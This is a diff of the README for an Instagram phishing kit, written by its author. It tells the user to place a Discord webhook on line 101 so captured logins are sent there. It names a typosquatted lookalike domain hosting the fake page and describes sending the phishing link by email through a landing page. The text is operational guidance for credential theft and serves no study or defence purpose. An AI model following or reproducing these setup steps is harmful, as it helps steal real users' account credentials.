@@ -1,4 +1,3 @@
-# zamphian
 Usage :
 
 My Instagram phishing page is really easy to use, you only have to replace WEBHOOK on line 101 by your Discord webhook
@@ -23,4 +22,3 @@ https://lnstaagram.netlify.app/
 
 To send phishing link via email
 download Instagram_Landing_Page.html connect it through a web page.
-In line 90 just replace https://lnstaagram.netlify.app/  with your phishing link.
